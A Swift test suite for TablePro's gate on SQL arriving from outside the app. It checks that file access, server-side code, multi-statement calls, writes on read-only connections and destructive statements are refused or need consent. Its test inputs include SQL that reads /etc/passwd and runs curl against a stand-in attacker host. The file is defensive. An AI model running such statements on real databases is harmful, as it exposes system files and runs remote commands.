//
//  ExternalStatementGateTests.swift
//  TableProTests
//
//  The refusals every caller outside the app's own windows shares. MCP had them first and still has
//  its own suite; these pin them where they now live, so a change made for one surface cannot
//  quietly loosen the other.
//

import Foundation
@testable import TablePro
import Testing

@Suite("External statement gate")
struct ExternalStatementGateTests {
    private func statement(
        _ sql: String,
        databaseType: DatabaseType = .postgresql,
        externalAccess: ExternalAccessLevel = .readWrite,
        allowsDestructive: Bool = true,
        allowsMultiStatement: Bool = false,
        destructiveAlternative: String? = nil
    ) -> ExternalStatementGate.Statement {
        ExternalStatementGate.Statement(
            sql: sql,
            connectionId: UUID(),
            databaseType: databaseType,
            externalAccess: externalAccess,
            allowsDestructive: allowsDestructive,
            allowsMultiStatement: allowsMultiStatement,
            destructiveAlternative: destructiveAlternative
        )
    }

    private func refusal(_ statement: ExternalStatementGate.Statement) -> ExternalStatementGateError? {
        do {
            _ = try ExternalStatementGate.classify(statement)
            return nil
        } catch let error as ExternalStatementGateError {
            return error
        } catch {
            return nil
        }
    }

    @Test("A plain read passes")
    func readsPass() throws {
        let classification = try ExternalStatementGate.classify(statement("SELECT 1"))
        #expect(classification.tier == .safe)
    }

    @Test("A statement that reaches the filesystem or runs server code is refused", arguments: [
        "COPY users FROM '/etc/passwd'",
        "COPY users TO PROGRAM 'curl attacker.example'",
        "SELECT pg_read_file('/etc/passwd')"
    ])
    func filesystemAndCodeRefused(sql: String) {
        #expect(refusal(statement(sql)) == .denied(
            String(
                localized: """
                Statements that read or write files, or that run server-side code, cannot be sent \
                from outside the app. Run this one in TablePro instead.
                """
            )
        ))
    }

    @Test("Several statements in one call are refused unless the caller asked for them")
    func multiStatementRefused() {
        let refused = refusal(statement("SELECT 1; SELECT 2"))
        #expect(refused == .invalidArgument(String(localized: "Send one statement at a time.")))

        #expect(refusal(statement("SELECT 1; SELECT 2", allowsMultiStatement: true)) == nil)
    }

    /// The connection setting a user reaches for when they want a script to look but not touch.
    @Test("A write is refused when the connection is read only for external clients", arguments: [
        ExternalAccessLevel.readOnly, ExternalAccessLevel.blocked
    ])
    func writesRefusedOnReadOnlyConnections(access: ExternalAccessLevel) {
        let refused = refusal(statement("UPDATE users SET name = 'x'", externalAccess: access))
        #expect(refused == .denied(String(localized: "This connection is read only for external clients.")))

        #expect(refusal(statement("SELECT 1", externalAccess: access)) == nil)
    }

    @Test("A destructive statement is refused when the caller may not run one")
    func destructiveRefusedWithoutPermission() {
        let refused = refusal(statement("DROP TABLE users", allowsDestructive: false))
        #expect(refused == .denied(String(localized: "This statement drops or truncates data.")))
    }

    /// MCP points at its confirmation tool, AppleScript confirms interactively and never gets here.
    /// The sentence is the transport's to supply so neither surface inherits the other's advice.
    @Test("The destructive refusal carries the caller's own alternative")
    func destructiveRefusalCarriesAlternative() {
        let refused = refusal(
            statement("DROP TABLE users", allowsDestructive: false, destructiveAlternative: "Do it in the app.")
        )
        #expect(refused == .denied(
            String(localized: "This statement drops or truncates data.") + " Do it in the app."
        ))
    }

    @Test("A destructive statement passes when the caller may run one")
    func destructiveAllowed() throws {
        let classification = try ExternalStatementGate.classify(statement("DROP TABLE users"))
        #expect(classification.tier == .destructive)
    }

    // MARK: - Consent

    @Test("Silent mode asks for nothing on a read, and Alert asks on a write")
    func consentFollowsSafeMode() {
        let read = QueryClassifier.classify("SELECT 1", databaseType: .postgresql)
        let write = QueryClassifier.classify("UPDATE users SET a = 1", databaseType: .postgresql)

        #expect(!ExternalStatementGate.requiresUserConsent(
            classification: read, sql: "SELECT 1", databaseType: .postgresql, safeModeLevel: .silent
        ))
        #expect(ExternalStatementGate.requiresUserConsent(
            classification: write, sql: "UPDATE users SET a = 1", databaseType: .postgresql, safeModeLevel: .alert
        ))
        #expect(ExternalStatementGate.requiresUserConsent(
            classification: read, sql: "SELECT 1", databaseType: .postgresql, safeModeLevel: .alertFull
        ))
    }

    /// Whatever the level says. A script that drops a table gets a person in front of it.
    @Test("A destructive statement always asks, even on Silent")
    func destructiveAlwaysAsks() {
        let drop = QueryClassifier.classify("DROP TABLE users", databaseType: .postgresql)
        #expect(ExternalStatementGate.requiresUserConsent(
            classification: drop, sql: "DROP TABLE users", databaseType: .postgresql, safeModeLevel: .silent
        ))
    }
}
